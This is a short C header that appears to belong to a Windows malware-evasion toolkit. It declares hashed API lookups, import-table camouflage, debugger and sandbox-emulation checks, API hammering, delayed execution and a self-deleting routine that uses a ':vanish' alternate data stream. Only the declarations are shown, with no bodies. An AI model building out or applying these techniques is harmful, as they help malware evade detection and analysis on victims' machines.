#include <Windows.h>

#define NEW_STREAM L":vanish"

typedef LPVOID(WINAPI* fnVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
typedef DWORD(WINAPI* fnFlsAlloc)(PFLS_CALLBACK_FUNCTION lpCallback);
typedef BOOL(WINAPI* fnIsDebuggerPresent)();
typedef NTSTATUS(WINAPI* fnNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval);

DWORD HashStringDjb2A(_In_ PCHAR String);
//DWORD HashStringDjb2W(_In_ PWCHAR String);
FARPROC NotGetProcAddress(IN HMODULE hModule, IN DWORD dwApiNameHash);
HMODULE NotGetModuleHandle(DWORD dwModuleNameHash);

int CheckSleepForwarding();
int CheckDebuggerPresence();
int CheckApiEmulation1();
int CheckApiEmulation2();
int CheckExecControl();
int APIHammering(DWORD dwStress);
int DelayExecution(DWORD dwDelay);
BOOL SelfDestruct();
int RandomCompileTimeSeed(void);
void IATCamouflage();
int InitEvasion();
